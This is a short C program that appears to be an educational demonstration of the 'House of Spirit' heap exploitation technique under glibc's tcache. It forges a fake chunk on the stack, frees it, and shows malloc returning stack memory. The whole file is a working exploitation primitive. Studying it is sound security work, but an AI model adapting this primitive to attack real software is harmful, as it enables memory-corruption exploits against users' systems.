#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>


typedef size_t INTERNAL_SIZE_T;

struct malloc_chunk {
    INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;


int main(int argc, const char* argv[]) {
    size_t fake_chunk_and_more[64];
    
    printf("This example showcases how the House of Spirite became more powerful " \
            " after the tcache patch\n");

    printf("Filling space at and after the fake chunk with invalid data\n");
    memset(fake_chunk_and_more, 'A', sizeof(fake_chunk_and_more));

    printf("Building fake chunk on the stack at %p\n", (void *)fake_chunk_and_more);
    mchunkptr fake_chunk = (mchunkptr)(void *)fake_chunk_and_more;
    fake_chunk->size = 0x110;

    void *mem = (void*)((char*)fake_chunk + offsetof(struct malloc_chunk, fd));
    free(mem);
    printf("Passed chunk to free, let's make an allocation for the fake size\n");

    void *mem2 = malloc(0x100);
    printf("malloc(0x100) returned: %p\n", mem2);

    return 0;
}

